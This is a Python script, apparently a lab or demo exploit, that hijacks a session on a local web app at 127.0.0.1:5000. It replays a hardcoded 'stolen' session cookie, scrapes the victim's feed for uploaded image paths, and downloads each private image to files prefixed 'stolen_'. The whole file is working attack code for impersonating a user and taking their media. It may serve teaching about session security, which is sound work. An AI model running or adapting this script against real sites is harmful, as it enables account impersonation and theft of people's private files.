import requests
import re

def sessionHijacking():
    target_feed_url = "http://127.0.0.1:5000/feed"
    
    stolen_cookie = {"session_id": "user_authenticated_123"}
    
    print("\nSESSION HIJACKING ATTACK")
    print(f"Impersonating victim using stolen cookie: {stolen_cookie}")
    
    response = requests.get(target_feed_url, cookies=stolen_cookie)
    
    if response.status_code == 200:
        print("SUCCESS: Session hijack succesfull.")
        
        image_matches = re.findall(r'src="(/uploads/[^"]+)"', response.text)
        
        if image_matches:
            print(f"Found {len(image_matches)} private media file(s)")
            
            for img_path in image_matches:
                img_url = f"http://127.0.0.1:5000{img_path}"
                filename = img_path.split("/")[-1]
                
                print(f"Downloading the private image from: {img_url}")
                img_response = requests.get(img_url, cookies=stolen_cookie)
                
                if img_response.status_code == 200:
                    local_filename = f"stolen_{filename}"
                    with open(local_filename, "wb") as f:
                        f.write(img_response.content)
                    print(f"    Successfully saved the image saved locally as '{local_filename}'!")
                else:
                    print(f"    Failed to download image {filename}")
        else:
            print("No images found!")
    else:
        print("Attack Failed!")

if __name__ == "__main__":
    sessionHijacking()